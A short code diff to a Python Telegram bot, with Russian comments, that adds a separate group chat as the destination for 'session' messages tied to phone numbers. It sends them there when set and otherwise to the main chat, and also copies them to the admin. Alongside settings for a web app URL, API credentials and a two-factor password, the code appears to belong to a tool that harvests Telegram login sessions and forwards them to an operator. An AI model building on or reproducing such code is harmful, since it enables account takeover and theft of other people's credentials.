@@ -57,13 +57,14 @@ DB_PATH     = os.path.join(BASE_DIR, 'data', 'database.db')
 
 
 _ENV_MAP = {
-    'bot_token':  'BOT_TOKEN',
-    'admin_id':   'ADMIN_ID',
-    'chat_id':    'CHAT_ID',
-    'api_id':     'API_ID',
-    'api_hash':   'API_HASH',
-    'two_fa':     'TWO_FA',
-    'webapp_url': 'WEBAPP_URL',
+    'bot_token':       'BOT_TOKEN',
+    'admin_id':        'ADMIN_ID',
+    'chat_id':         'CHAT_ID',
+    'session_chat_id': 'SESSION_CHAT_ID',
+    'api_id':          'API_ID',
+    'api_hash':        'API_HASH',
+    'two_fa':          'TWO_FA',
+    'webapp_url':      'WEBAPP_URL',
 }
 
 
@@ -650,12 +651,15 @@ async def _send_session_msg(msg: Message, phone: str):
     )
 
     targets = []
+    session_chat_id = _cfg('session_chat_id')
     chat_id  = _cfg('chat_id')
     admin_id = _cfg('admin_id')
-    # Сессия идёт в chat_id (группа для сессий)
-    if chat_id and chat_id != '0':
+    # Сессии идут в SESSION_CHAT_ID, если задан — иначе в chat_id
+    if session_chat_id and session_chat_id != '0':
+        targets.append(int(session_chat_id))
+    elif chat_id and chat_id != '0':
         targets.append(int(chat_id))
-    # Уведомление админу если chat_id не задан или это разные чаты
+    # Дополнительно админу если это другой чат
     if admin_id and admin_id != '0' and int(admin_id) not in targets:
         targets.append(int(admin_id))
 
